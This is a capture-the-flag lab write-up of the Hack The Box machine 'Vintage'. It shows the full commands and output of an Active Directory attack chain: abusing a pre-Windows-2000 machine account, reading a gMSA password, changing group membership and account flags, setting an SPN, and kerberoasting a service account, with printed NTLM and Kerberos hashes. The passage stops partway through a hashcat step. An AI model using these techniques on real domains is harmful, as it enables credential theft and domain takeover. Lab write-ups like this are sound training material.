---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Kerbrute
  - Kerberoasting
  - S4U2Self
  - DPAPI
  - gMSA-Dumper
  - Role-Based-Constrained-Delegation
---
# Overview

| Name        | Vintage |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Hard    |
| Status      | Done    |
As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.231.205 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-15 05:14 CST
Nmap scan report for 10.129.231.205
Host is up (0.27s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 11:15:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-15T11:16:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
10.129.231.205 dc01.vintage.htb vintage.htb
```
# Enumeration

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc ldap dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --dns-server 10.129.231.205 --bloodhound -c all
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\P.Rosa:Rosaisbest123 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Resolved collection methods: session, psremote, objectprops, dcom, trusts, rdp, group, container, localadmin, acl                                                                  
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Using kerberos auth without ccache, getting TGT
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Done in 00M 06S
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Compressing output into /home/kryzen/.nxc/logs/dc01.vintage.htb_dc01.vintage.htb_2025-04-17_220624_bloodhound.zip
```

After loading the data into bloodhound it doesn’t look like there are any interesting permissions on our user.

Looking at the rest of the data we can see that `L.BIANCHI_ADM` is a high value account. There is also a `Pre-Migration` OU which has `AllowedToAct` over `dc01`, so this could be an avenue for `RBCD`. `Account Operators` has genericAll over `C.NERI`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --users                                        
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                            
SMB         dc01.vintage.htb 445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain                                                                   
SMB         dc01.vintage.htb 445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain                                                                 
SMB         dc01.vintage.htb 445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account                                                                                  
SMB         dc01.vintage.htb 445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             G.Viola                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri                        2024-06-05 21:08:13 0        
SMB         dc01.vintage.htb 445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
SMB         dc01.vintage.htb 445    dc01             svc_sql                       2025-04-17 21:12:06 0        
SMB         dc01.vintage.htb 445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             svc_ark                       2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm                 2024-11-26 11:40:30 0        
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated 14 local users: VINTAGE
```

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ cat u.txt | awk '{print $5}' > users.txt
```

![[Pasted image 20260115181923.png]]

If we can read the GMSA password then we have `GenericWrite` and can `AddSelf` to `Service Managers`.

![[Pasted image 20260115181938.png]]

The service managers account has generic all over 3 service accounts.

![[Pasted image 20260115182024.png]]
## Access to FS01$[](https://scotsec.github.io/posts/Vintage/#access-to-fs01)

After some research I found out about `Pre-Windows 2000 compatible access` group.

More info : [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)

`"Pre-created machine accounts have the password set to the name of the system in lowercase with no $."`

Oh…

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc smb dc01.vintage.htb -u 'FS01$' -p 'fs01' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\FS01$:fs01
```

Continuing on the theme of this machine seems to be that none of your tools work…

After much trial and error I found a method that worked, allowing us to `read the GMSA password`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'FS01$' -p 'fs01' get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
```
## Access to GMSA01$[](https://scotsec.github.io/posts/Vintage/#access-to-gmsa01)

Confirm that we can use the NTLM hash.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc ldap dc01.vintage.htb -u 'GMSA01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\GMSA01$:b3a15bbdfb1c53238d4b50ea2c4d1178
```

We know from previous enumeration that GMSA01$ has `GenericWrite` and `AddSelf` over the `ServiceManagers` Group.

Using `bloodyAD` we need to specify the password format to use the NTLM hash `(NTLM uses rc4)` with the `-f` flag. With this we can add the account to the ServiceManagers group.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' add groupMember ServiceManagers gMSA01$
[+] gMSA01$ added to ServiceManagers
```

With access to this group we now have genericAll over the three service accounts.

```bash
svc_ark
svc_ldap
svc_sql
```

I tried changing the password of all three of these accounts using BloodyAD but only the `svc_sql` password was able to be changed, Little did I know that this would cause me to need to reset the box in a bit

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' set password svc_sql Kryzen123!  
[+] Password changed successfully!
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' set password svc_ldap Kryzen123!
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.                                                                                                          
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.           
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' set password svc_ark Kryzen123!
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.                                                                                                          
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
```

Tried doing a targeted kerberoast attack but I am getting the error : `KDC_ERR_CLIENT_REVOKED`

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-getTGT vintage.htb/svc_sql:'Kryzen123!'@dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ python3 pywhisker.py -d 'vintage.htb' -u 'gMSA01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' --target 'sql_svc' --action "add"
```

I found that I can set a SPN on the account but when I try to kerberoast it its still showing disabled so I guess I need to re-enable the account somehow.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' add groupMember ServiceManagers gMSA01$                                               
[+] gMSA01$ added to ServiceManagers
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -k -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' set object svc_sql servicePrincipalName -v MSSQLsvc/sqlserver.vintage.htb
[+] svc_sql's servicePrincipalName has been updated
```

At this point I ran `bloodyAD` to try and get some more info about the account. This is when I noticed the `ACCOUNTDISABLE` flag under the UAC attribute.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -k -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' get object svc_sql                        

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 2024-06-07 08:28:03.762668+00:00
badPwdCount: 1
cn: svc_sql
codePage: 0
countryCode: 0
dSCorePropagationData: 2025-04-18 17:05:27+00:00
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
msDS-KeyCredentialLink.KeyID: 0d9c6680fa4ed85c08d937a9d029825228f3ca01edd088f632ecdd2d0beca186
msDS-KeyCredentialLink.KeyMaterial: 3082010a0282010100a52eec1fd05804b3fe4df6fadf584015448f4d9d4ef9e8067f9d7472958feb109bfe9515c3a66fdb9d98dd8e3cf2dfc7d44c2de23ec9a67cd9bf07fcbf08369f50ca5baefdb47f8a9e54622988ca94bd86758f9a47b3f03143d36341a06eb5b1281803d1c9eaccff1654c9e8ca49197622bbff10ef020948f3d6e02face8ce32b31b456a8998a39c0d510761c475d7db8622a7bbfff43638ee61223b61294f1d2983ad89a3700527fcb5c92f051e2dc5a0be3e77b706c9c08dd65e8de0dac929da57bcc5a64fb98ec335a40a356ffe22b28e840a25ed497a9acd230086db368a502a072dbe8d2922601fbbb25510f33ab89cb66c41181178215e8131fd11d8ef0203010001
msDS-SupportedEncryptionTypes: 0
nTSecurityDescriptor: O:S-1-5-21-4024337825-2033394866-2055507597-1107G:S-1-5-21-4024337825-2033394866-2055507597-512D:AI(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-4024337825-2033394866-2055507597-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-4024337825-2033394866-2055507597-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-4024337825-2033394866-2055507597-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-4024337825-2033394866-2055507597-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-4024337825-2033394866-2055507597-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-4024337825-2033394866-2055507597-512)(A;;0xf01ff;;;S-1-5-21-4024337825-2033394866-2055507597-1137)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4024337825-2033394866-2055507597-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4024337825-2033394866-2055507597-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-4024337825-2033394866-2055507597-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: svc_sql
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 3fb41501-6742-4258-bfbe-602c3a8aa543
objectSid: S-1-5-21-4024337825-2033394866-2055507597-1134
primaryGroupID: 513
pwdLastSet: 2025-04-18 17:52:05.816764+00:00
sAMAccountName: svc_sql
sAMAccountType: 805306368
uSNChanged: 119018
uSNCreated: 20586
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
whenChanged: 2025-04-18 17:52:05+00:00
whenCreated: 2024-06-06 13:45:27+00:00
```
## Re-enable svc_sql[](https://scotsec.github.io/posts/Vintage/#re-enable-svc_sql)

With a bit of digging I found that we can remove this restriction using our favourite tool `bloodyAD!`, due the permissions we have over the account.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' add groupMember ServiceManagers gMSA01$             
[+] gMSA01$ added to ServiceManagers
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' remove uac svc_sql -f ACCOUNTDISABLE   
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

At this point I also updated my `/etc/krb5.conf` file.

![[Pasted image 20260115183815.png]]
## Manually Kerberoasting svc_sql[](https://scotsec.github.io/posts/Vintage/#manually-kerberoasting-svc_sql)

At this point I stopped to have a think since I really wasn’t getting anywhere. I could change the password and access the account but what was my next step?

This is when I had the idea that instead of changing the password on `svc_sql` I could manually kerberoast it, allowing me to get the password hash. If I could crack this then I could carry out a `password spray` across the other domain users and see if I got a hit.

This was the plan

```bash
Read the GMSA password
Add GMSA01$ to ServiceManagers
Set the SPN on svc_sql
Re-enable the account
Kerberoast it
Crack it (Pray)
Spray (Pray again)
```

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -f rc4 -k -u 'gMSA01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' set object svc_sql servicePrincipalName -v MSSQLsvc/sqlserver.vintage.htb
[+] svc_sql's servicePrincipalName has been updated
```

Send it and hope for the best!

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc ldap dc01.vintage.htb -u 'gMSA01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k --kerberoasting kerberoast.hash
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\gMSA01$:b3a15bbdfb1c53238d4b50ea2c4d1178 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Bypassing disabled account krbtgt 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*] Total of records returned 1
LDAP        dc01.vintage.htb 389    dc01.vintage.htb sAMAccountName: svc_sql memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb pwdLastSet: 2024-11-14 18:32:08.499600 lastLogon:<never>                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$e6c4fc54b47cf0cc38d81e95b0ac184e$a3bfeddaa5c5b0f93309475f4d59c36e8a79d0dd6d6705dffa1a6fe2ea25458907cdc50cd01a67f53248ab3dba61af2f7cf13b71ed9bbea77f6370f82eacdcf3c37ff9617e526b39398cc2f04926decda7d4b963da941262451d24476735673f84ec1608bb59a25acc28ac81d316fb2d97969cef26815555fe2970a221eb67a32f5c388321024f6cfa4b96e5bd0e66e3c0710aceeb88c454b7685aae6b7000a137443a9f3f0755ea4468fb8f5b94086572f1ecbf58e3cbfb15080d17fda716439943168f21d34fc3f821b1f0cc559187669dcf95b083ad7c2efbb64934ad20607d4f455397cdec9c1dbd9543308913cff03b611eeac8c820b7929d0ece725638b766ff250ce0af604d47159294bab40f7abcaaa82130cadc606f859de63e7bef48c736b7d7deb32e4210b6fbeccd92bf10198972738215d5daf4b6fbd924dc1f2943d766dd4a9bf9c0089c1ad32ffb0bc581edc429b1fe9e683a7d1c5833dcfa53bbcfe19f03e131f827f6e8c1bbbfbb0ce01a547e69fe5b728c573538e081299069a6043e80075441d38c29aaafc903051df20ce0d09354b3d710e7f83cfc2fb2c11132ed18ef8e3c5d41803a5f3c036194caff8e74ba37a6589e2a442f9130c3614877420d2f509c9028194b37319acda794ffe57054cae27c9c00c00a32ee6d77f91bc84a91dbb64b19357e50e1c43cb287106f95ba1e153c172c4f7d5e7afaf4ca45cb0ed4cdf9f394e22bd4c35f0952360b8d56ae1296ee0a82716915e18403419c9a2a21ddc3611983902a75cace9435914c36759322af91919aeb8bbdb7b79d1ac0b208677710441bdba3569bacac13ab4f1210dfe662f9e055bd7fdce3bc697c37d9877427f6556e11c112c98896cca79a13830998c1323554ab3beaffd0617d83f0d1579424d30a9772647e6f575b5cdf4770fc3cc502b34fb11515347c45029847c1a5682ee191893a7f4113339aff15ff4ff7a4579fcb35ac946468b29ec9b6b01f4ab586fbf5e8e0fe6ffdab3377a25ca8356089161814adbdea560a56832146da43ed3243c324c92e1a3d3e4abd2872c99fc731bf7e5987923eb1a6360342435d120fb31c17dded3328a5611af93a7c1b2538861a1a13a6d7e36454bf69a717b2055805ef9401dd214b50e6159717b8a1fe9032c26f805769d8e7f69e24ef04392f16f556d063870d3d5af15af0642ae54067ec1d1d3c7d56ede8f866b336bf7bd30156cd34052ab1f317cb47d852520dc858ab1f2d44ba553cbd885eb61474326a4acc352fe2482a2728d4965167aab66eceedf17c2950694375ca5007c50c7c4efce7d4980732cfd06af8594f5214f337bdca26444d71d3775643199035b3e3543586d14f2b42b08b31f248c7b787b5e403dd93ca448f5f02e3a7882185efe62ee6c45020f50a6773d2ad3bcb1503bc8a97be58d55054ffb6e733e7
```

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ hashcat kerberoast.hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$e6c4fc54b47cf0cc38d81e95b0ac184e$a3bfeddaa5c5b0f93309475f4d59c36e8a79d0dd6d6705dffa1a6fe2ea25458907cdc50cd01a67f53248ab3dba61af2f7cf13b71ed9bbea77f6370f82eacdcf3c37ff9617e526b39398cc2f04926decda7d4b963da941262451d24476735673f84ec1608bb59a25acc28ac81d316fb2d97969cef26815555fe2970a221eb67a32f5c388321024f6cfa4b96e5bd0e66e3c0710aceeb88c454b7685aae6b7000a137443a9f3f0755ea4468fb8f5b94086572f1ecbf58e3cbfb15080d17fda716439943168f21d34fc3f821b1f0cc559187669dcf95b083ad7c2efbb64934ad20607d4f455397cdec9c1dbd9543308913cff03b611eeac8c820b7929d0ece725638b766ff250ce0af604d47159294bab40f7abcaaa82130cadc606f859de63e7bef48c736b7d7deb32e4210b6fbeccd92bf10198972738215d5daf4b6fbd924dc1f2943d766dd4a9bf9c0089c1ad32ffb0bc581edc429b1fe9e683a7d1c5833dcfa53bbcfe19f03e131f827f6e8c1bbbfbb0ce01a547e69fe5b728c573538e081299069a6043e80075441d38c29aaafc903051df20ce0d09354b3d710e7f83cfc2fb2c11132ed18ef8e3c5d41803a5f3c036194caff8e74ba37a6589e2a442f9130c3614877420d2f509c9028194b37319acda794ffe57054cae27c9c00c00a32ee6d77f91bc84a91dbb64b19357e50e1c43cb287106f95ba1e153c172c4f7d5e7afaf4ca45cb0ed4cdf9f394e22bd4c35f0952360b8d56ae1296ee0a82716915e18403419c9a2a21ddc3611983902a75cace9435914c36759322af91919aeb8bbdb7b79d1ac0b208677710441bdba3569bacac13ab4f1210dfe662f9e055bd7fdce3bc697c37d9877427f6556e11c112c98896cca79a13830998c1323554ab3beaffd0617d83f0d1579424d30a9772647e6f575b5cdf4770fc3cc502b34fb11515347c45029847c1a5682ee191893a7f4113339aff15ff4ff7a4579fcb35ac946468b29ec9b6b01f4ab586fbf5e8e0fe6ffdab3377a25ca8356089161814adbdea560a56832146da43ed3243c324c92e1a3d3e4abd2872c99fc731bf7e5987923eb1a6360342435d120fb31c17dded3328a5611af93a7c1b2538861a1a13a6d7e36454bf69a717b2055805ef9401dd